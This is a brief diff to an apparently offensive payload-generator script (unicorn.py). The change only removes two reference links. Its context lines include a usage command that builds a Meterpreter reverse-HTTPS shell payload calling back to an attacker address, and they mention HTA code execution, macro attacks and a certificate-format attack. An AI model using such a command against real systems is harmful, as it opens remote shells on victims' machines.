@@ -448,8 +448,6 @@ then download the Unicorn HTA file which has the code execution capabilites.
 
 Special thanks and kudos to Matt Nelson for the awesome research
 
-Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
-
 Usage: 
 
 python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
@@ -613,7 +611,6 @@ def generate_macro(full_attack, line_length=50):
 
 
 # generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
-# - https://gist.github.com/mattifestation/47f9e8a431f96a266522
 def gen_cert_attack(filename):
     if os.path.isfile(filename):
         # make sure the directory is made
